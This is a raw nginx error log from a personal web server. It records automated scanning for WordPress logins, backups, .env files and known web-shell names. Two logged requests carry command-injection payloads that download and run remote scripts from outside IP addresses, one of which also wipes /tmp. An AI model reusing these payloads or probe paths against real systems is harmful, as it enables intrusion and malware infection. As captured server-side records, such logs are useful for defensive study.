2022/10/11 18:38:36 [error] 34#34: *20061 open() "/usr/share/nginx/html/wordpress" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /wordpress HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 18:38:37 [error] 34#34: *20061 open() "/usr/share/nginx/html/wp" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /wp HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 18:38:37 [error] 34#34: *20061 open() "/usr/share/nginx/html/bc" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /bc HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 18:38:37 [error] 34#34: *20061 open() "/usr/share/nginx/html/bk" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /bk HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 18:38:37 [error] 34#34: *20061 open() "/usr/share/nginx/html/backup" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /backup HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 18:38:37 [error] 34#34: *20061 open() "/usr/share/nginx/html/old" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /old HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 18:38:37 [error] 34#34: *20061 open() "/usr/share/nginx/html/new" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /new HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 18:38:38 [error] 34#34: *20061 open() "/usr/share/nginx/html/main" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /main HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 18:38:38 [error] 34#34: *20061 open() "/usr/share/nginx/html/home" failed (2: No such file or directory), client: 5.189.178.166, server: localhost, request: "HEAD /home HTTP/1.1", host: "labbity.unbiasedgeek.com"
2022/10/11 19:12:13 [error] 39#39: *20357 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET //favicon.ico HTTP/1.1", host: "unbiasedgeek.com"
2022/10/11 19:47:27 [error] 32#32: *21514 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.71.146.46, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/11 19:51:21 [error] 32#32: *21516 open() "/usr/share/nginx/html/actuator/gateway/routes" failed (2: No such file or directory), client: 152.89.196.211, server: localhost, request: "GET /actuator/gateway/routes HTTP/1.1", host: "71.195.237.231:80"
2022/10/11 20:24:41 [error] 39#39: *21625 open() "/usr/share/nginx/html/cgi-bin/;cd+/tmp;wget+http:/45.95.55.214/a/wget.sh;chmod+777+wget.sh;sh+wget.sh+Netgear;rm+-rf+wget.sh" failed (2: No such file or directory), client: 195.178.120.55, server: localhost, request: "GET /cgi-bin/;cd+%2Ftmp%3Bwget+http%3A%2F%2F45.95.55.214%2Fa%2Fwget.sh%3Bchmod+777+wget.sh%3Bsh+wget.sh+Netgear%3Brm+-rf+wget.sh HTTP/1.1", host: "71.195.237.231:80"
2022/10/11 21:05:13 [error] 33#33: *21663 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.70.134.70, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "unbiasedgeek.com"
2022/10/11 21:05:14 [error] 33#33: *21664 "/usr/share/nginx/html/tag/php/index.html" is not found (2: No such file or directory), client: 172.70.174.244, server: localhost, request: "GET /tag/php/ HTTP/1.1", host: "unbiasedgeek.com"
2022/10/11 21:50:14 [error] 34#34: *21857 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "unbiasedgeek.com"
2022/10/11 22:35:13 [error] 34#34: *21864 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.70.178.142, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/11 23:04:25 [error] 39#39: *21889 open() "/usr/share/nginx/html/wp-content/themes/seotheme/db.php" failed (2: No such file or directory), client: 162.158.2.50, server: localhost, request: "GET ///wp-content/themes/seotheme/db.php HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/11 23:14:13 [error] 39#39: *21891 open() "/usr/share/nginx/html/shell" failed (2: No such file or directory), client: 197.58.131.238, server: localhost, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+81.161.229.46/jaws;sh+/tmp/jaws HTTP/1.1", host: "127.0.0.1:80"
2022/10/11 23:30:14 [error] 33#33: *21916 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET //favicon.ico HTTP/1.1", host: "unbiasedgeek.com"
2022/10/11 23:30:15 [error] 33#33: *21917 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 172.70.34.92, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "unbiasedgeek.com"
2022/10/11 23:47:13 [error] 37#37: *21972 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.71.126.138, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 01:16:00 [error] 38#38: *22122 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.68.11.85, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "unbiasedgeek.com"
2022/10/12 01:36:54 [error] 38#38: *22124 open() "/usr/share/nginx/html/wp-login.php" failed (2: No such file or directory), client: 141.101.68.30, server: localhost, request: "GET /wp-login.php HTTP/1.1", host: "unbiasedgeek.com"
2022/10/12 02:10:06 [error] 38#38: *22125 open() "/usr/share/nginx/html/druid/index.html" failed (2: No such file or directory), client: 192.241.220.79, server: localhost, request: "GET /druid/index.html HTTP/1.1", host: "71.195.237.231"
2022/10/12 04:32:12 [error] 39#39: *22140 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 64.62.197.203, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "71.195.237.231"
2022/10/12 05:49:56 [error] 39#39: *22147 open() "/usr/share/nginx/html/wp-login.php" failed (2: No such file or directory), client: 23.97.205.210, server: localhost, request: "GET /wp-login.php HTTP/1.1", host: "emby.unbiasedgeek.com", referrer: "http://emby.unbiasedgeek.com"
2022/10/12 05:49:56 [error] 39#39: *22148 open() "/usr/share/nginx/html/wordpress/wp-login.php" failed (2: No such file or directory), client: 23.97.205.210, server: localhost, request: "GET /wordpress/wp-login.php HTTP/1.1", host: "emby.unbiasedgeek.com", referrer: "http://emby.unbiasedgeek.com"
2022/10/12 05:49:57 [error] 39#39: *22149 open() "/usr/share/nginx/html/blog/wp-login.php" failed (2: No such file or directory), client: 23.97.205.210, server: localhost, request: "GET /blog/wp-login.php HTTP/1.1", host: "emby.unbiasedgeek.com", referrer: "http://emby.unbiasedgeek.com"
2022/10/12 05:49:57 [error] 39#39: *22150 open() "/usr/share/nginx/html/wp/wp-login.php" failed (2: No such file or directory), client: 23.97.205.210, server: localhost, request: "GET /wp/wp-login.php HTTP/1.1", host: "emby.unbiasedgeek.com", referrer: "http://emby.unbiasedgeek.com"
2022/10/12 05:53:36 [error] 39#39: *22151 open() "/usr/share/nginx/html/wp-plain.php" failed (2: No such file or directory), client: 172.71.98.186, server: localhost, request: "POST /wp-plain.php HTTP/1.1", host: "www.unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 05:53:36 [error] 39#39: *22152 open() "/usr/share/nginx/html/wp-content/plugins/dzs-zoomsounds/savepng.php" failed (2: No such file or directory), client: 172.71.98.200, server: localhost, request: "GET /wp-content/plugins/dzs-zoomsounds/savepng.php?location=1877.php HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 05:53:36 [error] 32#32: *22154 open() "/usr/share/nginx/html/ALFA_DATA/alfacgiapi/perl.alfa" failed (2: No such file or directory), client: 172.71.98.114, server: localhost, request: "POST /ALFA_DATA/alfacgiapi/perl.alfa HTTP/1.1", host: "www.unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 05:53:36 [error] 39#39: *22151 open() "/usr/share/nginx/html/mmwnpvdr.php" failed (2: No such file or directory), client: 172.71.98.186, server: localhost, request: "GET /mmwnpvdr.php?Fox=d3wL7 HTTP/1.1", host: "www.unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 05:53:36 [error] 32#32: *22154 open() "/usr/share/nginx/html/alfacgiapi/perl.alfa" failed (2: No such file or directory), client: 172.71.98.114, server: localhost, request: "POST /alfacgiapi/perl.alfa HTTP/1.1", host: "www.unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 06:23:47 [error] 32#32: *22158 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 45.61.186.4, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "71.195.237.231:80", referrer: "http://71.195.237.231:80/admin/login.asp"
2022/10/12 06:33:41 [error] 32#32: *22161 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 209.141.41.193, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "71.195.237.231"
2022/10/12 06:34:34 [error] 32#32: *22162 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 209.141.36.231, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "unbiasedgeek.com"
2022/10/12 06:34:57 [error] 32#32: *22163 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 209.141.36.112, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "c-71-195-237-231.hsd1.ut.comcast.net"
2022/10/12 07:07:28 [error] 33#33: *22169 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 108.162.237.102, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 07:19:50 [error] 33#33: *22171 open() "/usr/share/nginx/html/.env" failed (2: No such file or directory), client: 206.226.64.150, server: localhost, request: "GET /.env HTTP/1.1", host: "71.195.237.231"
2022/10/12 07:22:45 [error] 33#33: *22173 "/usr/share/nginx/html/prepping-the-garden/index.html" is not found (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /prepping-the-garden/ HTTP/1.1", host: "unbiasedgeek.com"
2022/10/12 07:23:48 [error] 33#33: *22174 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.71.150.64, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "unbiasedgeek.com"
2022/10/12 08:21:10 [error] 38#38: *24170 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "unbiasedgeek.com"
2022/10/12 08:26:46 [error] 38#38: *24181 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.70.174.42, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:26:47 [error] 38#38: *24182 open() "/usr/share/nginx/html/xmlrpc.php" failed (2: No such file or directory), client: 172.70.174.212, server: localhost, request: "GET /xmlrpc.php?rsd HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:26:47 [error] 38#38: *24182 open() "/usr/share/nginx/html/blog/robots.txt" failed (2: No such file or directory), client: 172.70.174.212, server: localhost, request: "GET /blog/robots.txt HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:26:47 [error] 38#38: *24182 "/usr/share/nginx/html/blog/index.html" is not found (2: No such file or directory), client: 172.70.174.212, server: localhost, request: "GET /blog/ HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:26:47 [error] 38#38: *24182 "/usr/share/nginx/html/wordpress/index.html" is not found (2: No such file or directory), client: 172.70.174.212, server: localhost, request: "GET /wordpress/ HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:26:47 [error] 38#38: *24182 "/usr/share/nginx/html/wp/index.html" is not found (2: No such file or directory), client: 172.70.174.212, server: localhost, request: "GET /wp/ HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:50:35 [error] 34#34: *24288 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 172.70.38.32, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:50:35 [error] 34#34: *24289 open() "/usr/share/nginx/html/xmlrpc.php" failed (2: No such file or directory), client: 172.70.38.204, server: localhost, request: "GET /xmlrpc.php?rsd HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:50:35 [error] 34#34: *24289 open() "/usr/share/nginx/html/blog/robots.txt" failed (2: No such file or directory), client: 172.70.38.204, server: localhost, request: "GET /blog/robots.txt HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:50:35 [error] 34#34: *24289 "/usr/share/nginx/html/blog/index.html" is not found (2: No such file or directory), client: 172.70.38.204, server: localhost, request: "GET /blog/ HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:50:35 [error] 34#34: *24289 "/usr/share/nginx/html/wordpress/index.html" is not found (2: No such file or directory), client: 172.70.38.204, server: localhost, request: "GET /wordpress/ HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 08:50:35 [error] 34#34: *24289 "/usr/share/nginx/html/wp/index.html" is not found (2: No such file or directory), client: 172.70.38.204, server: localhost, request: "GET /wp/ HTTP/1.1", host: "www.unbiasedgeek.com"
2022/10/12 09:41:54 [error] 38#38: *24299 open() "/usr/share/nginx/html/wp-includes/class-index-wordpress.php" failed (2: No such file or directory), client: 172.71.98.48, server: localhost, request: "GET /wp-includes/class-index-wordpress.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:41:57 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-includes/class-index-wordpress.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-includes/class-index-wordpress.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:00 [error] 38#38: *24300 open() "/usr/share/nginx/html/wp-admin/js/widgets/wp-login.php" failed (2: No such file or directory), client: 172.71.94.78, server: localhost, request: "GET /wp-admin/js/widgets/wp-login.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:09 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-admin/js/widgets/wp-login.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-admin/js/widgets/wp-login.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:12 [error] 38#38: *24301 open() "/usr/share/nginx/html/wp-includes/wp-system-cloud.php" failed (2: No such file or directory), client: 172.71.102.182, server: localhost, request: "GET /wp-includes/wp-system-cloud.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:15 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-includes/wp-system-cloud.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-includes/wp-system-cloud.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:17 [error] 38#38: *24301 open() "/usr/share/nginx/html/wp-includes/class-wp-page-icon.php" failed (2: No such file or directory), client: 172.71.102.182, server: localhost, request: "GET /wp-includes/class-wp-page-icon.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:20 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-includes/class-wp-page-icon.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-includes/class-wp-page-icon.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:26 [error] 38#38: *24302 open() "/usr/share/nginx/html/wp-includes/class-wordpress-license.php" failed (2: No such file or directory), client: 172.71.94.110, server: localhost, request: "GET /wp-includes/class-wordpress-license.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:33 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-includes/class-wordpress-license.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-includes/class-wordpress-license.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:39 [error] 38#38: *24301 open() "/usr/share/nginx/html/wp-commentin.php" failed (2: No such file or directory), client: 172.71.102.182, server: localhost, request: "GET /wp-commentin.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:52 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-commentin.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-commentin.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:42:57 [error] 38#38: *24301 open() "/usr/share/nginx/html/help.php" failed (2: No such file or directory), client: 172.71.102.182, server: localhost, request: "GET /help.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:04 [error] 38#38: *24298 open() "/usr/share/nginx/html/help.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /help.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:09 [error] 38#38: *24303 open() "/usr/share/nginx/html/xltavrat.php" failed (2: No such file or directory), client: 172.71.102.176, server: localhost, request: "GET /xltavrat.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:17 [error] 38#38: *24298 open() "/usr/share/nginx/html/xltavrat.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /xltavrat.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:22 [error] 38#38: *24304 open() "/usr/share/nginx/html/xleet.php" failed (2: No such file or directory), client: 172.71.94.252, server: localhost, request: "GET /xleet.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:30 [error] 38#38: *24298 open() "/usr/share/nginx/html/xleet.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /xleet.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:37 [error] 38#38: *24303 open() "/usr/share/nginx/html/xl.php" failed (2: No such file or directory), client: 172.71.102.176, server: localhost, request: "GET /xl.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:44 [error] 38#38: *24298 open() "/usr/share/nginx/html/xl.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /xl.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:49 [error] 38#38: *24305 open() "/usr/share/nginx/html/x.php" failed (2: No such file or directory), client: 172.71.98.12, server: localhost, request: "GET /x.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:43:58 [error] 38#38: *24298 open() "/usr/share/nginx/html/x.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /x.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:44:03 [error] 38#38: *24306 open() "/usr/share/nginx/html/0z.php" failed (2: No such file or directory), client: 172.71.94.180, server: localhost, request: "GET /0z.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:44:10 [error] 38#38: *24298 open() "/usr/share/nginx/html/0z.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /0z.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:44:19 [error] 38#38: *24307 open() "/usr/share/nginx/html/wp-includes/ms-data.php" failed (2: No such file or directory), client: 141.101.77.47, server: localhost, request: "GET /wp-includes/ms-data.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:44:23 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-includes/ms-data.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-includes/ms-data.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:44:28 [error] 38#38: *24308 open() "/usr/share/nginx/html/wp-includes/pomo/umpomone.php" failed (2: No such file or directory), client: 172.71.102.182, server: localhost, request: "GET /wp-includes/pomo/umpomone.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:44:37 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-includes/pomo/umpomone.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-includes/pomo/umpomone.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:44:45 [error] 38#38: *24309 open() "/usr/share/nginx/html/wp-content/themes/seotheme/0z.php" failed (2: No such file or directory), client: 172.71.102.200, server: localhost, request: "GET /wp-content/themes/seotheme/0z.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:44:57 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-content/themes/seotheme/0z.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-content/themes/seotheme/0z.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:00 [error] 38#38: *24310 open() "/usr/share/nginx/html/xleet-shell.php" failed (2: No such file or directory), client: 172.71.98.114, server: localhost, request: "GET /xleet-shell.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:08 [error] 38#38: *24298 open() "/usr/share/nginx/html/xleet-shell.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /xleet-shell.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:13 [error] 38#38: *24311 open() "/usr/share/nginx/html/1.php" failed (2: No such file or directory), client: 141.101.76.214, server: localhost, request: "GET /1.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:22 [error] 38#38: *24298 open() "/usr/share/nginx/html/1.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /1.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:29 [error] 38#38: *24312 open() "/usr/share/nginx/html/about.php" failed (2: No such file or directory), client: 141.101.76.152, server: localhost, request: "GET /about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:37 [error] 38#38: *24298 open() "/usr/share/nginx/html/about.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /about.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:42 [error] 39#39: *24313 open() "/usr/share/nginx/html/wp-content/0z.php" failed (2: No such file or directory), client: 172.71.102.182, server: localhost, request: "GET /wp-content/0z.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:49 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-content/0z.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-content/0z.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:45:56 [error] 39#39: *24314 open() "/usr/share/nginx/html/wp-admin/0z.php" failed (2: No such file or directory), client: 172.71.98.48, server: localhost, request: "GET /wp-admin/0z.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:04 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-admin/0z.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-admin/0z.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:10 [error] 39#39: *24315 open() "/usr/share/nginx/html/phpinf0.php" failed (2: No such file or directory), client: 172.71.94.252, server: localhost, request: "GET /phpinf0.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:14 [error] 38#38: *24298 open() "/usr/share/nginx/html/phpinf0.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /phpinf0.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:18 [error] 39#39: *24316 open() "/usr/share/nginx/html/admin.php" failed (2: No such file or directory), client: 172.71.98.12, server: localhost, request: "GET /admin.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:21 [error] 38#38: *24298 open() "/usr/share/nginx/html/admin.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /admin.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:26 [error] 39#39: *24318 open() "/usr/share/nginx/html/class.php" failed (2: No such file or directory), client: 141.101.76.66, server: localhost, request: "GET /class.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:30 [error] 38#38: *24298 open() "/usr/share/nginx/html/class.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /class.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:42 [error] 39#39: *24319 open() "/usr/share/nginx/html/wp-class.php" failed (2: No such file or directory), client: 172.71.102.200, server: localhost, request: "GET /wp-class.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:47 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-class.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-class.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:49 [error] 39#39: *24315 open() "/usr/share/nginx/html/wp-admin/shell20211028.php" failed (2: No such file or directory), client: 172.71.94.252, server: localhost, request: "GET /wp-admin/shell20211028.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:53 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-admin/shell20211028.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-admin/shell20211028.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:55 [error] 39#39: *24320 open() "/usr/share/nginx/html/vah.php" failed (2: No such file or directory), client: 172.71.98.190, server: localhost, request: "GET /vah.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:46:59 [error] 38#38: *24298 open() "/usr/share/nginx/html/vah.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /vah.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:02 [error] 39#39: *24321 open() "/usr/share/nginx/html/wp-includes/wp-class.php" failed (2: No such file or directory), client: 172.71.102.176, server: localhost, request: "GET /wp-includes/wp-class.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:09 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-includes/wp-class.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-includes/wp-class.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:13 [error] 39#39: *24322 open() "/usr/share/nginx/html/wp-content/plugins/press/wp-class.php" failed (2: No such file or directory), client: 172.71.98.48, server: localhost, request: "GET /wp-content/plugins/press/wp-class.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:16 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-content/plugins/press/wp-class.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-content/plugins/press/wp-class.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:19 [error] 39#39: *24323 open() "/usr/share/nginx/html/wp-content/plugins/wp-json-api-disable/wwdv.php" failed (2: No such file or directory), client: 172.71.102.144, server: localhost, request: "GET /wp-content/plugins/wp-json-api-disable/wwdv.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:26 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-content/plugins/wp-json-api-disable/wwdv.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-content/plugins/wp-json-api-disable/wwdv.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:29 [error] 39#39: *24315 open() "/usr/share/nginx/html/wp-content/plugins/wp-classic/wp-classic/wp-classic.php" failed (2: No such file or directory), client: 172.71.94.252, server: localhost, request: "GET /wp-content/plugins/wp-classic/wp-classic/wp-classic.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:32 [error] 38#38: *24298 open() "/usr/share/nginx/html/wp-content/plugins/wp-classic/wp-classic/wp-classic.php" failed (2: No such file or directory), client: 172.17.0.1, server: localhost, request: "GET /wp-content/plugins/wp-classic/wp-classic/wp-classic.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
2022/10/12 09:47:36 [error] 39#39: *24319 open() "/usr/share/nginx/html/wp-content/themes/twenty/twenty.php" failed (2: No such file or directory), client: 172.71.102.200, server: localhost, request: "GET /wp-content/themes/twenty/twenty.php HTTP/1.1", host: "unbiasedgeek.com", referrer: "www.google.com"
